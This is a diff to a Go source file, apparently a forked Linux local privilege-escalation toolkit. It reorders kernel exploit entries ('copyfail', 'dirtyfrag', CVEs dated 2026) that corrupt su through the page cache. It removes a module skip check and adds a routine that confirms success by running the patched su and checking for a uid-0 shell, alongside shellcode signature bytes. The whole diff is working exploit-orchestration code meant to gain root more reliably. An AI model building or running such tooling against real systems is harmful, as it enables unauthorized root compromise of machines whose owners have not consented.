@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"context"
 	"embed"
 	"fmt"
@@ -190,6 +191,24 @@ type Toolkit struct {
 func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *Toolkit {
 	exploits := []Exploit{
 		{
+			Name:     "copyfail",
+			Filename: "copyfail.c",
+			// [FORK] ships the badsectorlabs copyfail-go binary
+			// (vendored into exploits/bin/<arch>/copyfail at build time):
+			// the upstream C version was observed failing where the Go one
+			// succeeds. The Go binary patches su on a bare run, matching
+			// the isPageCachePwned detection model.
+			Description: "CVE-2026-31431: Copy Fail (copyfail-go) - AF_ALG + splice page-cache write",
+			Introduced:  "4.14",
+			FixedIn:     []string{"6.18.22", "6.19.12", "7.0"},
+			CompileCmd:  []string{"gcc", "-static", "-O2", "-s"},
+			Timeout: 120 * time.Second,
+			// [FORK] upstream algif SkipCheck removed: built-in modules are
+			// not visible in /proc/modules, so the check wrongly skipped the
+			// exploit (the C version likely never ran at all); the Go binary
+			// fails fast on its own when AF_ALG is unavailable.
+		},
+		{
 			Name:        "dirtyfrag",
 			Filename:    "dirtyfrag.c",
 			Description: "CVE-2026-43284+CVE-2026-43500: Dirty Frag - xfrm-ESP/RxRPC page-cache write",
@@ -212,24 +231,6 @@ func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *T
 			Introduced:  "4.10",
 			FixedIn:     []string{"5.10.255", "5.15.205", "6.1.171", "6.6.138", "6.12.87", "6.18.28", "7.0.5"},
 			CompileCmd:  []string{"gcc", "-O2", "-Wall", "-Wextra", "-std=gnu11", "-static"},
-		},
-		{
-			Name:     "copyfail",
-			Filename: "copyfail.c",
-			// [FORK] ships the badsectorlabs copyfail-go binary
-			// (vendored into exploits/bin/<arch>/copyfail at build time):
-			// the upstream C version was observed failing where the Go one
-			// succeeds. The Go binary patches su on a bare run, matching
-			// the isPageCachePwned detection model.
-			Description: "CVE-2026-31431: Copy Fail (copyfail-go) - AF_ALG + splice page-cache write",
-			Introduced:  "4.14",
-			FixedIn:     []string{"6.18.22", "6.19.12", "7.0"},
-			CompileCmd:  []string{"gcc", "-static", "-O2", "-s"},
-			Timeout: 120 * time.Second,
-			// [FORK] upstream algif SkipCheck removed: built-in modules are
-			// not visible in /proc/modules, so the check wrongly skipped the
-			// exploit (the C version likely never ran at all); the Go binary
-			// fails fast on its own when AF_ALG is unavailable.
 		},
 		{
 			Name:        "dirtydecrypt",
@@ -651,6 +652,22 @@ func (tk *Toolkit) dropCaches() {
 
 // ── Success checks ──────────────────────────────────────────────────────────
 
+// [FORK] verifySuPwned runs the patched su and requires an actual root
+// shell result; a page-cache marker without a working su is a false positive.
+func (tk *Toolkit) verifySuPwned() bool {
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, "su", "-c", "id -u")
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = nil
+	cmd.Stdin = nil
+	if err := cmd.Run(); err != nil {
+		return false
+	}
+	return strings.TrimSpace(out.String()) == "0"
+}
+
 func isPageCachePwned() bool {
 	shellcodeSig := []byte{0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a}
 	shellcodeSig2 := []byte{0x31, 0xff, 0xb0, 0x69}
@@ -776,17 +793,22 @@ func (tk *Toolkit) runExploit(exp Exploit, binary string) bool {
 		return ok
 	}
 
-	// Default: check for page cache contamination
-	if err == nil {
-		if isPageCachePwned() {
+	// [FORK] strict page-cache verification: the contamination marker alone
+	// can false-positive (observed: dirtyfrag on Kali 2025 arm64 wrote garbage
+	// into su's page cache and the patched su could not exec, yet the marker
+	// matched and the run stopped there). Only declare success when the
+	// patched su actually spawns a root shell (id -u == 0); otherwise treat
+	// it as failed and let the next exploit run.
+	if err == nil || isPageCachePwned() {
+		if tk.verifySuPwned() {
 			return true
 		}
-		tk.log("Exploit exited 0 but no patch detected")
+		if err == nil {
+			tk.log("Exploit exited 0 but no patch detected")
+		} else {
+			tk.log("Page cache marker set but the patched su does not work - continuing")
+		}
 		return false
-	}
-	if isPageCachePwned() {
-		tk.log("Page cache pwned despite exploit error")
-		return true
 	}
 	tk.log("Exploit exited: %v", err)
 	return false
